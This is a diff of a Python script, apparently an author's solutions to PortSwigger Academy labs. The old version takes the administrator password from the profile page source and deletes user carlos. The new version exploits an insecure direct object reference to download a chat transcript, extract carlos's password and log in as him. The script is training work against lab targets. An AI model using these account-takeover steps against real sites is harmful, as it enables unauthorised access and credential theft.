@@ -1,17 +1,16 @@
-####################################################################################
+###############################################################
 #
 # Author: Ahmed Elqalawii
 #
 # Date: 5/9/2023
 #
-# PortSwigger LAB: User ID controlled by request parameter with password disclosure
+# PortSwigger LAB: Insecure direct object references
 #
-# Steps: 1. Fetch administrator page via URL id parameter
-#        2. Extract the password from source code
-#        3. Login as administrator
-#        4. Delete carlos
+# Steps: 1. Fetch 1.txt log file
+#        2. Extract carlos password from the log file
+#        3. Login as carlos
 #
-#####################################################################################
+################################################################
 
 ###########
 # imports
@@ -21,19 +20,19 @@ import re
 from colorama import Fore
 
 # change this url to your lab
-url = "https://0a4a00c003b919c1847df99a00b10055.web-security-academy.net"
+url = "https://0a05000e04213bdf82746f4400b80068.web-security-academy.net"
 
-try:  # fetch administrator profile
+try:  # fetch 1.txt log file
     admin_profile = requests.get(
-        f"{url}/my-account?id=administrator")
+        f"{url}/download-transcript/1.txt")
     if admin_profile.status_code == 200:
-        print(Fore.WHITE + "1. Fetching administrator profile page.. " +
+        print(Fore.WHITE + "1. Fetching 1.txt log file.. " +
               Fore.GREEN + "OK")
-        # extract the administrator password from source code
-        admin_pass = re.findall("name=password value='(.*)'",
-                                admin_profile.text)[0]
-        print(Fore.WHITE + "2. Extracting password from source code.. " +
-              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)
+        # extract the carlos password from source code
+        carlos_pass = re.findall(r"password is (.*)\.",
+                                 admin_profile.text)[0]
+        print(Fore.WHITE + "2. Extracting password from the log file.. " +
+              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + carlos_pass)
         try:  # fetch login page to get valid session and csrf token
             get_login = requests.get(
                 f"{url}/login")
@@ -45,10 +44,10 @@ try:  # fetch administrator profile
                 # extract the csrf token
                 csrf = re.findall("csrf.+value=\"(.+)\"",
                                   get_login.content.decode())[0]
-                try:  # login as administrator
+                try:  # login as carlos
                     data = {
-                        "username": "administrator",
-                        "password": admin_pass,
+                        "username": "carlos",
+                        "password": carlos_pass,
                         "csrf": csrf
                     }
                     cookies = {
@@ -58,30 +57,30 @@ try:  # fetch administrator profile
                         f"{url}/login", data, cookies=cookies, allow_redirects=False)
                     if login.status_code == 302:
                         print(
-                            Fore.WHITE + "4. Logging in as administrator.. " + Fore.GREEN + "OK")
+                            Fore.WHITE + "4. Logging in as carlos.. " + Fore.GREEN + "OK")
                         # extract the new session
                         new_session = login.cookies.get("session")
-                        try:  # delete carlos
+                        try:  # fetch carlos profile
                             cookies = {"session": new_session}
                             delete_carlos = requests.get(
-                                f"{url}/admin/delete?username=carlos", cookies=cookies)
+                                f"{url}/my-account", cookies=cookies)
                             if delete_carlos.status_code == 200:
                                 print(
-                                    Fore.WHITE + "5. Deleting carlos.. " + Fore.GREEN + "OK")
+                                    Fore.WHITE + "5. Fetching carlos profile.. " + Fore.GREEN + "OK")
                                 print(
                                     Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                             else:
                                 print(
-                                    Fore.RED + "[!] Failed to delete carlos")
+                                    Fore.RED + "[!] Failed to fetch carlos profile")
                         except:
                             print(
-                                Fore.RED + "[!] Failed to delete carlos through exception")
+                                Fore.RED + "[!] Failed to fetch carlos profile through exception")
                     else:
                         print(
-                            Fore.RED + "[!] Failed to login as administrator")
+                            Fore.RED + "[!] Failed to login as carlos")
                 except:
                     print(
-                        Fore.RED + "[!] Failed to login as administrator through exception")
+                        Fore.RED + "[!] Failed to login as carlos through exception")
             else:
                 print(
                     Fore.RED + "[!] Failed to fetch login page")
@@ -89,7 +88,7 @@ try:  # fetch administrator profile
             print(
                 Fore.RED + "[!] Failed to fetch login page through exception")
     else:
-        print(Fore.RED + "[!] Failed to fetch administrator profile")
+        print(Fore.RED + "[!] Failed to fetch 1.txt log file")
 except:
     print(
-        Fore.RED + "[!] Failed to fetch administrator profile through exception")
+        Fore.RED + "[!] Failed to fetch 1.txt log file through exception")
